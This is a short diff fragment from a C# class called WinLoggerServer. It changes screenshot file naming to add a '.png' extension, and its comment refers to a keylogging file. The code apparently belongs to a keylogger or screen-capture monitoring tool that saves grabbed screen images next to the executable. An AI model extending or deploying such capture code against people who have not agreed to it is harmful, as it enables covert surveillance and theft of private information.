@@ -50,7 +50,7 @@ public class WinLoggerServer {
 					screenGrab = Image.FromStream(memStream);
 				}
                 // Append text to the keylogging file.
-                string append = "logFileLine" + index.ToString();
+                string append = "logFileLine" + index.ToString() + ".png";
 				string screenfp = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + @"\" + append;
 				index++;
 				screenGrab.Save(screenfp);
